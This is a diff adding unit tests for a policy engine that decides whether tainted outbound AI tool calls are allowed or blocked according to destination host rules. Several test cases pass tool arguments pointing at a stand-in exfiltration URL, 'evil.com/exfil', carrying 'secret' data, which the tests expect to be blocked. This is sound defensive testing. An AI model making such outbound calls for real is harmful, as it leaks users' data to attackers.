@@ -602,3 +602,111 @@ class TestSinkPolicyEngine:
         )
         sink = self.engine._classify_sink(tool, {"data": "hello"})
         assert sink == SinkType.MEMORY_WRITE
+
+
+# --- Destination Policy Sink Policy tests ---
+
+
+from ollama_mcp_bridge.types import DestinationPolicy
+
+
+class TestDestinationPolicySinkPolicy:
+    """Tests for PR 11 destination policy integration in SinkPolicyEngine."""
+
+    def setup_method(self):
+        self.engine = SinkPolicyEngine()
+        self.tainted = TaintState(
+            tainted=True,
+            taint_sources=["test:web_search"],
+            taint_reasons=["url from search"],
+            confidence=0.9,
+        )
+        self.config = SecurityConfig()
+
+    def test_tainted_outbound_destination_policy_match(self):
+        """URL matching a destination policy returns ALLOW_WITH_NOTICE."""
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://api.example.com/v1/data", "data": "ok"}
+        policies = [DestinationPolicy(
+            host="api.example.com", path_prefixes=["/v1/"],
+        )]
+        result = self.engine.evaluate(
+            tool, args, self.tainted, self.config,
+            destination_policies=policies,
+        )
+        assert result == SinkDecision.ALLOW_WITH_NOTICE
+
+    def test_tainted_outbound_destination_policy_no_match(self):
+        """URL not matching any destination policy falls through to block."""
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://evil.com/exfil", "data": "secret"}
+        policies = [DestinationPolicy(host="api.example.com")]
+        result = self.engine.evaluate(
+            tool, args, self.tainted, self.config,
+            destination_policies=policies,
+        )
+        assert result == SinkDecision.BLOCK
+
+    def test_destination_policy_checked_before_domain_list(self):
+        """When destination policies exist, domain list is not consulted."""
+        config = SecurityConfig(allowed_outbound_domains=["evil.com"])
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://evil.com/exfil", "data": "secret"}
+        # Policy restricts to different host — should block even though domain list allows evil.com
+        policies = [DestinationPolicy(host="safe.example.com")]
+        result = self.engine.evaluate(
+            tool, args, self.tainted, config,
+            destination_policies=policies,
+        )
+        assert result == SinkDecision.BLOCK
+
+    def test_require_flag_blocks_when_no_policies(self):
+        """require_destination_policy_for_outbound=True blocks when no policies exist."""
+        config = SecurityConfig(
+            require_destination_policy_for_outbound=True,
+            block_tainted_exfiltration=False,
+        )
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://any.com/data", "data": "secret"}
+        result = self.engine.evaluate(
+            tool, args, self.tainted, config,
+            destination_policies=None,
+        )
+        assert result == SinkDecision.BLOCK
+
+    def test_backward_compat_domain_list_still_works(self):
+        """When no destination_policies passed, allowed_outbound_domains path runs."""
+        config = SecurityConfig(allowed_outbound_domains=["example.com"])
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://example.com/api", "data": "ok"}
+        result = self.engine.evaluate(
+            tool, args, self.tainted, config,
+            destination_policies=None,
+        )
+        assert result == SinkDecision.ALLOW_WITH_NOTICE
+
+    def test_multiple_policies_any_match_sufficient(self):
+        """URL matching ANY one of multiple policies is allowed."""
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://partner.com/webhook", "data": "event"}
+        policies = [
+            DestinationPolicy(host="internal.com"),
+            DestinationPolicy(host="partner.com"),
+        ]
+        result = self.engine.evaluate(
+            tool, args, self.tainted, self.config,
+            destination_policies=policies,
+        )
+        assert result == SinkDecision.ALLOW_WITH_NOTICE
+
+    def test_not_tainted_still_allows_with_policies(self):
+        """Non-tainted calls always ALLOW regardless of policies."""
+        clean = TaintState()
+        tool = _make_tool(schema=_WRITE_SCHEMA)
+        args = {"url": "https://evil.com/exfil"}
+        policies = [DestinationPolicy(host="safe.com")]
+        result = self.engine.evaluate(
+            tool, args, clean, self.config,
+            destination_policies=policies,
+        )
+        assert result == SinkDecision.ALLOW
